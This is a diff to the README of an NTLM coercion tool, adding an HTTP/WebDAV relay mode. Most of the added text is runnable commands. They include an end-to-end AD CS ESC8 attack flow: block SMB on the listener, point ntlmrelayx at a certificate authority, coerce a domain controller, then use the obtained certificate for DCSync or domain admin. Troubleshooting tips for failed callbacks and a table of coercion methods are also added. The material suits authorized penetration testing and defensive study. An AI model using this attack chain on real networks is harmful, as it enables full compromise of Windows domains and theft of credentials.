@@ -74,7 +74,137 @@ NTLM coercion tool using authenticated DCERPC with PKT_PRIVACY (encryption + sig
 
 # Through SOCKS5 proxy
 ./goercer -t <target> -l <listener> -u <user> -d <domain> --proxy socks5://127.0.0.1:1080
+
+# HTTP relay mode (for AD CS ESC8, Exchange relay, etc.)
+# Requires WebClient service running on target (uses WebDAV \\SERVER@PORT\path format)
+./goercer -t <target> -l <listener-ip> -u <user> -d <domain> --http
 ```
+
+## HTTP/WebDAV Coercion (Port 80)
+
+The `--http` flag enables HTTP/WebDAV coercion for relay attacks like AD CS ESC8. This triggers authentication over HTTP (port 80) instead of SMB (port 445).
+
+### How It Works
+
+When using `--http`, goercer sends WebDAV-formatted paths like `\\10.1.1.99@80/test\test\Settings.ini`:
+- The `@80` tells Windows to use WebDAV/HTTP protocol
+- The `/test` path (forward slash) triggers WebClient service
+- The `\test\Settings.ini` (backslashes) completes the file path
+- Target machine makes HTTP request to listener on port 80
+
+### Critical Setup Requirements
+
+**1. WebClient Service Must Be Running on Target**
+```powershell
+# Check if WebClient is running
+sc query webclient
+
+# Start WebClient (requires admin on target)
+sc start webclient
+```
+
+**2. Block SMB on Your Listener Machine**
+
+Windows tries SMB first by default. You MUST block port 445 to force HTTP fallback:
+
+```bash
+# Block SMB ports on your listener
+sudo iptables -A INPUT -p tcp --dport 445 -j DROP
+sudo iptables -A INPUT -p tcp --dport 139 -j DROP
+
+# Verify SMB is blocked
+sudo iptables -L INPUT -n | grep 445
+```
+
+**3. Run Responder with WebDAV Enabled**
+
+The `-w` flag is critical - without it, Responder won't respond to WebDAV requests:
+
+```bash
+# Correct - with WebDAV support
+sudo responder -I eth0 -wv
+
+# Or use ntlmrelayx for relay attacks
+sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80 -smb2support
+```
+
+### Usage Examples
+
+**Basic HTTP coercion:**
+```bash
+./goercer -t 192.168.1.10 -l 10.1.1.99 -u admin -d domain.local --http
+```
+
+**Custom WebDAV path:**
+```bash
+# You can specify custom path format
+./goercer -t 192.168.1.10 -l 10.1.1.99@80/share -u admin -d domain.local --http
+```
+
+**ESC8 attack flow:**
+```bash
+# 1. Block SMB on attacker machine
+sudo iptables -A INPUT -p tcp --dport 445 -j DROP
+
+# 2. Start ntlmrelayx targeting ADCS
+sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
+    -smb2support --adcs --template DomainController
+
+# 3. Trigger HTTP coercion from domain controller
+./goercer -t dc.domain.local -l 10.1.1.99 -u admin -d domain.local --http
+
+# 4. Relay triggers ADCS ESC8, obtains DC certificate
+# 5. Use certificate for DCSync or domain admin
+```
+
+### Troubleshooting
+
+**Problem: Getting SMB callbacks on port 445 instead of HTTP on port 80**
+
+- **Solution**: Port 445 is still open on your listener. Block it with iptables (see above).
+- Windows prioritizes SMB over HTTP. HTTP only triggers when SMB explicitly fails.
+
+**Problem: No callbacks at all**
+
+- Check WebClient service is running on target: `sc query webclient`
+- Verify Responder is using `-w` flag for WebDAV support
+- Ensure firewall allows inbound port 80 on listener
+- Try verbose mode to see exact paths: `./goercer ... --http -v`
+
+**Problem: WebClient service won't start on target**
+
+- WebClient may be disabled by Group Policy
+- Try different coercion method: SpoolSample often works better for HTTP than PetitPotam
+- Some Windows versions/patches restrict WebClient activation
+
+### Supported Methods
+
+All coercion methods support `--http` mode:
+
+| Method | HTTP Support | Notes |
+|--------|--------------|-------|
+| PetitPotam | ✅ | Works on most Windows versions |
+| SpoolSample | ✅ | Often better HTTP success rate |
+| ShadowCoerce | ✅ | Requires VSS configured |
+| DFSCoerce | ✅ | Requires DFS role |
+
+### WebDAV Path Format
+
+goercer automatically constructs the proper WebDAV path format:
+
+```
+Input:  -l 10.1.1.99 --http
+Output: \\10.1.1.99@80/test\test\Settings.ini
+
+Breakdown:
+\\           - UNC path prefix
+10.1.1.99    - Listener IP
+@80          - Port 80 indicator (triggers WebDAV)
+/test        - Forward slash path (WebDAV format)
+\test\Settings.ini - Backslash file path (Windows format)
+```
+
+This mixed forward/backslash format is proven to work reliably across Windows versions.
 
 ## Flags
 
@@ -90,6 +220,7 @@ NTLM coercion tool using authenticated DCERPC with PKT_PRIVACY (encryption + sig
 | `--pipe` | Named pipe: `efsrpc`, `lsarpc`, `samr`, `netlogon`, `lsass` |
 | `--opnum` | Specific opnum to test |
 | `--proxy` | SOCKS5 proxy URL |
+| `--http` | Use HTTP URL instead of UNC for relay (e.g., AD CS ESC8) |
 | `-v, --verbose` | Debug output |
 
 ## Install
